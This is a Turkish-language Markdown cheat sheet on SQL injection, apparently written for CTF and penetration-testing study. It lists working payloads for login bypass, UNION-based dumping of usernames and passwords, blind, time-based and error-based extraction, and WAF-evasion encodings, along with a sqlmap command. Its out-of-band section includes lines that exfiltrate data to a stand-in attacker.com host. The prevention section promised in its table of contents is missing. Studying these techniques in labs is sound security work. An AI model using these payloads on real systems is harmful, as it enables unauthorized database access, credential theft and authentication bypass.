# SQL Injection (SQLi) Rehberi (2025)

## 📑 İçerik
- [Giriş](#-giriş)
- [SQL Injection Türleri](#-sql-injection-türleri)
- [Temel Payload'lar](#-temel-payloadlar)
- [Eski / Çalışma İhtimali Düşük Payload'lar](#-eski--çalışma-ihtimali-düşük-payloadlar)
- [WAF Bypass Payload'ları](#-waf-bypass-payloadları)
- [Tespit Yöntemleri](#-tespit-yöntemleri)
- [SQLi ile Olası Saldırı Senaryoları](#-sqli-ile-olası-saldırı-senaryoları)
- [Önleme Yöntemleri](#-önleme-yöntemleri)
- [SQLMap Kullanımı](#-sqlmap-kullanımı)
- [Test Ortamları](#-test-ortamları)
- [Kaynaklar](#-kaynaklar)

---
## 🎯 Giriş

**SQL Injection (SQLi)**, web uygulamalarında kullanıcı girdilerinin doğrudan SQL sorgularına dahil edilmesi sonucu, saldırganın veritabanına yetkisiz erişim sağlamasına imkan veren bir güvenlik açığıdır.

### 📌 Önemli Notlar
- **Risk Seviyesi:** Kritik (OWASP Top 10 listesinde daima üst sıralarda)
- **Temel Amaç:** SQL sorgularını manipüle ederek veri okuma, değiştirme, silme veya sisteme erişim sağlamak.
- **Etkilediği Sistemler:** MySQL, PostgreSQL, MSSQL, Oracle, SQLite vb. hemen her veritabanı.
- **Kullanım Alanı:** CTF yarışmaları, penetrasyon testleri, güvenlik araştırmaları.
- **Görülme Sıklığı:** Özellikle eski veya giriş doğrulaması zayıf web uygulamalarında sıkça rastlanır.

### 💡 SQLi Açığı Nasıl Oluşur?
- Kullanıcıdan alınan girdi, **doğrudan** SQL sorgusuna eklenirse.
- **Parametre kontrolü** veya **hazırlanmış ifadeler (prepared statements)** kullanılmazsa.
- Input doğrulama ve filtreleme yapılmazsa.

### 🛡️ Basit Örnek
Zayıf kod:
```php
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";

```
Eğer ?user=admin'-- girilirse, sorgu şu hale gelir:

`SELECT * FROM users WHERE username = 'admin'--'`


Saldırganlar bu açık sayesinde:
- Veritabanındaki hassas verileri okuyabilir.
- Veritabanını değiştirebilir veya silebilir.
- Kimlik doğrulama mekanizmalarını atlatabilir.
- Bazı durumlarda işletim sistemi üzerinde komut çalıştırabilir.

---

## 🔍 SQL Injection Türleri

SQL Injection, uygulamanın verdiği geri bildirim veya veri tabanı ile olan etkileşim şekline göre farklı türlere ayrılır.

### 1️⃣ Klasik (Error-based) SQLi
- **Tanım:** Hata mesajları üzerinden veri tabanı yapısı ve veriler hakkında bilgi elde edilir.
- **Çalışma Mantığı:** Hata döndürerek tablo, kolon isimleri, veri tipleri öğrenilir.
- **Örnek Payload:**
` ' OR 1=1-- `
- **Avantaj:** Hızlı veri toplama.
- **Dezavantaj:** Hata mesajları kapalı ise işe yaramaz.

### 2️⃣ Blind SQLi (Kör SQL Injection)
- **Tanım:** Sunucu hata mesajı vermez, sadece TRUE/FALSE durumuna göre tepki alınır.
- **Türleri:**
- **Boolean-based Blind:** Cevap sayfa içeriğine göre değişir.
  ```
  ' AND 1=1--
  ' AND 1=2--
  ```
- **Time-based Blind:** Sorgu sonucuna göre sunucu gecikme yapar.
  ```
  ' OR IF(1=1, SLEEP(5), 0)--
  ```
- **Avantaj:** Hata mesajı olmadan veri çekilebilir.
- **Dezavantaj:** Veri toplama yavaş.

### 3️⃣ Union-based SQLi
- **Tanım:** UNION operatorü ile farklı SELECT sorgularının sonuçları birleştirilir.
- **Örnek:**
` ' UNION SELECT username, password FROM users-- `
- **Avantaj:** Direkt veri dökümü yapılabilir.
- **Dezavantaj:** Kolon sayısı bilinmeli.

### 4️⃣ Out-of-Band SQLi
- **Tanım:** Veri doğrudan HTTP cevabında değil, DNS veya HTTP isteği ile saldırgana iletilir.
- **Örnek:** `LOAD_FILE()`, `xp_dirtree` ile dış kaynaklara erişim.
- **Avantaj:** Kör ortamlarda veri sızdırabilir.
- **Dezavantaj:** Hedef sistemin dış iletişim yeteneği olmalı.

### 5️⃣ Second-Order SQLi
- **Tanım:** Zararlı veri ilk adımda zararsız gibi kaydedilir, daha sonra başka sorgularda tetiklenir.
- **Örnek:** Kayıt olurken eklenen zararlı payload, admin panelinde çalışması.
- **Avantaj:** Filtreleri aşmak kolay olabilir.
- **Dezavantaj:** Tetiklenmesi zaman alabilir.

### 📌 Özet
- **Error-based:** Hata mesajı kullanılır.
- **Blind:** Mantıksal veya zaman tabanlı.
- **Union-based:** Veri birleştirme ile dump.
- **Out-of-Band:** Alternatif kanal ile veri sızdırma.
- **Second-Order:** Sonradan tetiklenen saldırılar.
---


## 🕵️‍♂️ SQL Injection Tespit Yöntemleri

SQL Injection zafiyetini anlamak için hem manuel hem de otomatik yöntemler kullanılır.

### 1️⃣ Manuel Test Yöntemleri
- **Özel Karakter Denemeleri:** `'`, `"`, `--`, `#`, `;` gibi karakterlerle uygulamanın tepkisi ölçülür.
  - Örnek:
    ```
    test'
    test"
    test--
    ```
- **Mantıksal Testler:**
  - TRUE ve FALSE sorguları ile sayfa farkı ölçme.
    ```
    1' AND 1=1--
    1' AND 1=2--
    ```
- **Zaman Gecikmesi Testleri (Time-based Blind):**
  - Sonuç doğru ise gecikme yaşanır, değilse anında döner.
    ```
    1' OR IF(1=1, SLEEP(5), 0)--
    ```
- **ORDER BY Testi (Kolon Sayısı Bulma):**
    ```
    1' ORDER BY 3--
    1' ORDER BY 4--
    ```
  Hata verene kadar artırılır.

### 2️⃣ Hata Mesajı Analizi
- **MySQL:** `You have an error in your SQL syntax;`
- **MSSQL:** `Unclosed quotation mark after the character string`
- **PostgreSQL:** `syntax error at or near`
- **Oracle:** `ORA-01756: quoted string not properly terminated`

### 3️⃣ URL ve Parametre Analizi
- Parametreleri tek tek değiştirip anormal tepki var mı bakılır.
- GET ve POST parametreleri yanında Cookie, Header alanları da kontrol edilir.

### 4️⃣ Otomatik Araçlar
- **sqlmap:** En bilinen otomatik test aracı.
`sqlmap -u "http://hedef.com/index.php?id=1" --dbs`
- **Havij, jSQL, NoSQLMap:** Alternatif araçlar.

### 5️⃣ WAF Bypass Tespiti
- Bazı filtreler SQL Injection'ı engeller, bu durumda:
- **Payload değiştirme**
- **Encoding kullanma (URL encode, Hex encode)**
- **Yorum satırları ile bölme**
  ```
  SELECT/**/user/**/FROM/**/users
  ```

### 📌 Özet
- Öncelikle **manuel test** ile zafiyet doğrulanır.
- Hata mesajları ve sayfa farklılıkları izlenir.
- Otomatik araçlar ile derin tarama yapılır.
- Filtreler varsa WAF bypass teknikleri uygulanır.
  
---



## 💻 Temel Payload'lar
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `' OR '1'='1` | Basit login bypass | ✅ |
| `admin'--` | Yorum satırı ile parola kontrolünü atlama | ✅ |
| `' UNION SELECT null,null--` | Kolon sayısı tespiti | ✅ |
| `' UNION SELECT username,password FROM users--` | Kullanıcı bilgilerini çekme | ✅ |
| `' AND 1=2 UNION SELECT 1,version()--` | Versiyon bilgisi alma | ✅ |
| `1 AND SLEEP(5)` | Time-based SQLi testi | ✅ |
| `' AND SUBSTRING(@@version,1,1)='5'--` | Versiyonun ilk karakterini kontrol etme | ✅ |
| `1' ORDER BY 3#` | Kolon sayısını bulma | ✅ |
| `' OR EXISTS(SELECT * FROM users)--` | Veri varlığını test etme | ✅ |

---

## 🕰️ Eski / Çalışma İhtimali Düşük Payload'lar
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `' OR 'a'='a'` | Basit bypass (modern WAF'larda engellenir) | ❌ |
| `' OR 1=1#` | MySQL için eski yorum tipi | ❌ |
| `OR 'x'='x' /*` | Eski yorum kapatma tekniği | ❌ |
| `UNION SELECT *` | Standart yıldız select çoğu yerde engellenir | ❌ |

---


SQL Injection testlerinde kullanılan en yaygın payloadlar ve açıklamaları:

### 1️⃣ Basit Login Bypass

' OR '1'='1
' OR 1=1--
" OR "1"="1
" OR 1=1--
admin' --
admin' #

### 2️⃣ UNION-BASED SQLi Örnekleri
' UNION SELECT null, null--
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, null FROM information_schema.tables--
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--


### 3️⃣ Boolean-Based Blind SQLi
' AND 1=1--
' AND 1=2--
' OR 1=1--
' OR 1=2--

### 4️⃣ Time-Based Blind SQLi

1' OR IF(1=1, SLEEP(5), 0)--
1' OR IF(ASCII(SUBSTRING(user(),1,1))=97, SLEEP(5), 0)--
1' WAITFOR DELAY '0:0:5'-- -- MSSQL

### 5️⃣ Error-Based SQLi
' AND extractvalue(1,concat(0x3a,(SELECT database())))--
' AND updatexml(1,concat(0x3a,(SELECT user())),1)--

### 6️⃣ Out-of-Band SQLi
'; EXEC master..xp_dirtree '\attacker.com\share'--
LOAD_FILE('\\attacker.com\file.txt')

### 7️⃣ Kolon / Tablo Sorguları
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
' UNION SELECT 1,2,3-- -- Kolon sayısı öğrenme


### 8️⃣ Second-Order SQLi Örneği

' ; INSERT INTO logs(message) VALUES('malicious')--


- İlk kayıtta zararsız gibi duran payload, daha sonra başka sorguda tetiklenir.

### 📌 Özet Notlar
- **Tek tırnak, çift tırnak, yorum satırı (`--`, `#`, `/* */`)** çok sık kullanılır.
- **Union tabanlı SQLi** için **kolon sayısı ve veri tipleri** önemlidir.
- **Blind SQLi** yavaş ama güvenlidir, hata mesajı olmadan veri çeker.
- **Time-based Blind** veri çıkarma işlemleri için gecikme kullanılır.
- **Out-of-Band SQLi**, DNS veya HTTP istekleri ile veri sızdırır.

- 
---


## 🔍 Tespit Yöntemleri
- **Manuel test**: `'`, `"`, `--`, `#`, `/*` gibi karakterlerle hata mesajı tetikleme.
- **Veri tahmini**: Boolean veya time-based tekniklerle veri varlığı doğrulama.
- **Araçlar**:
  - **sqlmap**
  - **Havij** (eski ama eğitim amaçlı)
  - **Burp Suite Intruder**
  - **NoSQLMap** (NoSQL sistemler için)
- **Kaynak kod analizi**: Parametrelerin direkt SQL sorgusuna eklenip eklenmediğini kontrol et.

---

## 🛡️ WAF Bypass Payload'ları
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `UNIunionON SELECT` | Anahtar kelimeyi bölme | ⚠️ |
| `/*!50000 UNION SELECT*/` | MySQL özel yorumları | ⚠️ |
| `%55nion%20select` | URL encode ile bypass | ⚠️ |
| `'UNI%4F N SELECT` | UTF-8 encoding ile bypass | ⚠️ |
| `1'/**/UNION/**/SELECT` | Yorum satırı ile ayırma | ⚠️ |
| `1' OR '1' = '1' -- -` | Farklı yorum bitirme teknikleri | ⚠️ |


Web uygulamalarındaki WAF (Web Application Firewall) veya filtreleri aşmak için kullanılan teknikler ve payload örnekleri:

### 1️⃣ HTML / SQL Keyword Parçalama
- WAF bazı kelimeleri filtreler, araya yorum satırı veya boşluk ekleyerek bypass yapılabilir.
 ```
UN//ION//SELECT
SEL/**/ECT username, password
```


### 2️⃣ ASCII / Char Kodlama
- Karakterleri ASCII veya CHAR() fonksiyonu ile ifade etmek.
 ```
SELECT CHAR(117,115,101,114) FROM users
SELECT user() FROM dual WHERE id=CHAR(97,100,109,105,110)
 ```

### 3️⃣ URL / Hex Encode
- URL encode veya hex encode ile WAF’ı atlatmak.
 ```
%27 OR %271%27=%271
0x61646D696E -- admin
 ```

### 4️⃣ Case Manipülasyonu
- Büyük/küçük harf değişimi ile filtreyi bypass etmek.
 ```
SeLeCt username FROM users
UnIoN sElEcT null,null--
 ```

### 5️⃣ Yorum Satırı ile Bölme
- SQL keyword’lerini bölerek bypass.
 ```
UNION/comment/SELECT
SEL/x/ECT password FROM users
 ```

### 6️⃣ Karakter Obfuscation / Fonksiyon Kullanımı
 ```
CONCAT(CHAR(97,100,109,105,110),CHAR(58),password)
 ```

### 7️⃣ Boolean / Time-Based Bypass
- Basit TRUE/FALSE mantığı veya gecikme fonksiyonu kullanarak WAF’ı atlatmak.
 ```
1' AND 1=1-- -- normal
1' AND 1=1/**/-- -- yorum satırı eklenmiş
1' OR IF(1=1, SLEEP(5), 0)-- -- time-based
 ```

### 📌 Özet Notlar
- **WAF filtreleri** genellikle SQL keywordlerini, özel karakterleri veya tekrarlayan pattern’leri engeller.
- **Encoding, keyword parçalama, yorum satırları, case değişimi ve CHAR() fonksiyonu** en yaygın bypass yöntemleridir.
- **Blind SQLi veya Out-of-Band** ile WAF’ı tamamen bypass etmek mümkün olabilir.


## 🚨 Olası Saldırı Senaryoları
- Kullanıcı bilgilerini çekme
- Admin paneline erişim
- Veri silme / değiştirme
- Sunucu dosya sistemine erişim
- Shell upload

---

## 🧪 Test Ortamları
- DVWA (Damn Vulnerable Web Application)
- bWAPP
- Mutillidae
- PortSwigger Labs
- SQLi Labs

---

## 📚 Kaynaklar
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PortSwigger Academy](https://portswigger.net/web-security/sql-injection)

---
